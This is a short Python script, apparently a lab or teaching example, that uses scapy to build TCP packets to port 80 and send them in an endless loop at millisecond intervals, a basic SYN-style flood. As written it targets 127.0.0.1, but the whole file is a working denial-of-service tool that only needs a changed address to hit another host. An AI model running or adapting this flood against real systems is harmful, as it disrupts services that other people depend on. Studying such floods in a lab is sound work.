from scapy.all import *
import time
source_IP = "127.0.0.1"
target_IP = "127.0.0.1"
source_port = int(input("Enter Source Port Number:"))
i = 1

while (True):
   IP1 = IP(src = source_IP, dst = target_IP)
   TCP1 = TCP(sport = source_port, dport = 80)
   pkt = IP1 / TCP1
   send(pkt, inter = 0.001)
   
   print ("Packet Sent ", i)
   i = i + 1
